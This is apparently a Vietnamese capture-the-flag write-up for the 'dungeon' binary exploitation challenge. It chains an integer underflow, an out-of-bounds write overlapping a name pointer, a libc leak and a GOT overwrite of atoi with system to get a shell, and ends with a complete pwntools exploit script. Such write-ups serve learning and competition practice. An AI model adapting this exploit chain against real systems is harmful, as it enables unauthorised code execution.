# dungeon---Write-up-----KCSC-Recruitment-2026

Hướng dẫn cách giải bài dungeon của giải KCSC-Recruitment-2026

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 22/12/2025

## 1. Mục tiêu cần làm
Bài này code rất là dài nên mình đã nhờ bé Gemini-chan của mình tổng hợp lại các lỗi chính và cách hoạt động của code này.

Chúng ta sẽ sử dụng 3 lỗi cơ bản trong bài này là :
- Integer Underflow ( Tràn số âm )
- Out-of-Bounds - OOB
- GOT Overwrite

Lỗi nằm ở chỗ nào thì mời các bạn sang phần 2.

## 2. Cách thực thi
Đầu tiên chúng ta là lỗi tràn số âm.

```C
void sell_weapon() {
    // ...
    for (int i = 0; i <= inventory_count; i++) { // Duyệt cả khi inventory_count = 0
        if (!strcmp(Inventory[i].name, buf)) {   // Nếu tên khớp
            // ... logic xóa phần tử ...
            inventory_count--; // <--- ĐÂY LÀ ĐIỂM YẾU
            return;
        }
    }
}
```

Nếu chúng ta nhập chuỗi rỗng ( tức là chỉ bấm Enter ) khi gọi `sell_weapon`. Nó sẽ so sánh với `nventory[0].name` ( cũng là rỗng ). Từ đó khớp và thực thi lệnh `inventory_count--;`. Hậu quả là từ 0 thành -1. Vì `inventory_count` là kiểu `uint8_t` nên nó sẽ thành 255. Nhưng `inventory` chỉ có 100 phần tử thôi, chưa kể này còn là mảng toàn cục. Vậy là chúng ta có thể sử dụng lỗi **OOB**.

```Python
p.sendlineafter(b">> ", b"1") 
p.sendlineafter(b"No): ", b"0") 
p.sendlineafter(b">> ", b"3") 
p.sendlineafter(b"sell: ", b"") 
```

Giờ mục tiêu của chúng ta là gọi `system(/bin/sh)`. Nhưng làm sao để gọi ? Bài này là `Partial RELRO` nên chúng ta có thể sử dụng `GOT overwrite`. Giờ hãy nhìn vào hàm `read_num` đi.

```C
int read_num()
{
    char buf[16];
    read_str(buf, sizeof(buf));
    return atoi(buf);
}
```

Nó sẽ return `atoi()`. Nếu chúng ta nhập `buf` là `/bin/sh` và thay `atoi` bằng `system` là bú.

Giờ phân tích tiếp nè :
- Địa chỉ `Inventory` bắt đầu tại `0x405520`
- Mỗi struct `Weapon` dài 52 byte.
- Vị trí của vũ khí thứ 101 ( index 100 ) là : `0x405520 + ( 100 x 52 ) = 0x406970`.
- Trong struct `Weapon`, `attack` nằm ở offset **+48 byte**. Vậy địa chỉ của `Inventory[100].attack` là : `0x406970 + 48 = 0x4069a0`.
- Mặt khác, con trỏ `player.name` cũng nằm tại địa chỉ `0x4069a0`.

Vậy suy ra `Inventory[100].attack` và con trỏ `player.name` thực chất là cùng 1 ô nhớ.

Hàm `enhance_weapons` cho phép chúng ta cộng 1 số tiền vào `Inventory[].attack`. Thì `player.name` cũng sẽ cộng thêm số tiền đó vào địa chỉ nó sắp trỏ tới. Để dễ hình dung thì khi mới chạy chương trình, `player.name = default_name`. Và nếu ta `enhance_weapons` là 36 thì nó sẽ tương đương `player.name += 36`. Lúc này nó sẽ không còn trỏ về `default_name` nữa mà trỏ vào địa chỉ cao hơn `default_name` 36 byte.

Vậy nếu ta muốn `player.name` trỏ vào chính nó thì ta lấy địa chỉ `default_name - player.name = 0x4069a0 - 0x4050c0 = 0x18e0 ( 6368 )`.

```Python
p.sendlineafter(b">> ", b"4")
p.sendlineafter(b"cancel): ", b"101")
p.sendlineafter(b"ATK): ", b"6368")
```

Sau khi `player.name` trỏ về chính nó thì khi ta sử dụng hàm `edit_info()` thì chúng ta có thể ghi địa chỉ `atoi` vào con trỏ `player.name` và sau đó sử dụng `show_status()` để leak địa chỉ `atoi`. Từ đó leak được **Libc**.

Giờ đã có leak **Libc** thì ta sẽ có được **Libc base** và ta có được `system`. Giờ chỉ việc ghi đè `atoi@got` thành `system@got` thôi. Chúng ta sẽ gọi lại `edit_info()` ( nó vẫn đang trỏ vào địa chỉ `atoi@got` ), sau đó ghi đè bằng địa chỉ `system@got` là xong.

```Python
p.sendlineafter(b">> ", b"6")
p.sendlineafter(b"no): ", b"1")
p.sendlineafter(b"new name: ", p64(elf.got['atoi']))

p.sendlineafter(b">> ", b"5")
p.recvuntil(b"Name     : ")

atoi_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"Atoi leak: {hex(atoi_leak)}")

libc.address = atoi_leak - libc.symbols['atoi']
log.success(f"Libc Base (Aligned): {hex(libc.address)}")

p.sendlineafter(b">> ", b"6")
p.sendlineafter(b"no): ", b"1")

p.sendlineafter(b"new name: ", p64(libc.symbols['system']))
```

Cuối cùng là gọi `read_num` và ghi `/bin/sh` là xong.

Bài này hơi dài tí nhưng nhờ bé Gemini-chan đọc và phân tích những chỗ gây lỗi thì mình đã có thể giải rất nhanh ( tiết kiệm thời gian đọc code ). Cảm ơn Gemini nhiều ❤️. Bài này cũng không có gì khó hết đơn giản vì nó có hết rồi, hãy cho mình và gemini 1 star để có động lực viết tiếp write up nha 🐧.

À quên chỉ các bạn cách tìm địa chỉ của mấy thằng mình xài ở trên nè. Gõ gdb rồi start, sau đó gõ lần lượt các lệnh sau là ra.

<img width="570" height="527" alt="image" src="https://github.com/user-attachments/assets/e4d3a84e-fff5-4c57-9f67-7729bbb3ceba" />

## 3. Exploit

```Python
from pwn import *


context.binary = elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') 

p = process('./vuln')
# p = remote('67.223.119.69', 5024)

p.sendlineafter(b">> ", b"1") 
p.sendlineafter(b"No): ", b"0") 
p.sendlineafter(b">> ", b"3") 
p.sendlineafter(b"sell: ", b"") 

p.sendlineafter(b">> ", b"4")
p.sendlineafter(b"cancel): ", b"101")
p.sendlineafter(b"ATK): ", b"6368")

p.sendlineafter(b">> ", b"6")
p.sendlineafter(b"no): ", b"1")
p.sendlineafter(b"new name: ", p64(elf.got['atoi']))

p.sendlineafter(b">> ", b"5")
p.recvuntil(b"Name     : ")

atoi_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"Atoi leak: {hex(atoi_leak)}")


libc.address = atoi_leak - libc.symbols['atoi']
log.success(f"Libc Base (Aligned): {hex(libc.address)}")


p.sendlineafter(b">> ", b"6")
p.sendlineafter(b"no): ", b"1")

p.sendlineafter(b"new name: ", p64(libc.symbols['system']))

p.sendlineafter(b">> ", b"/bin/sh")

p.interactive()
```
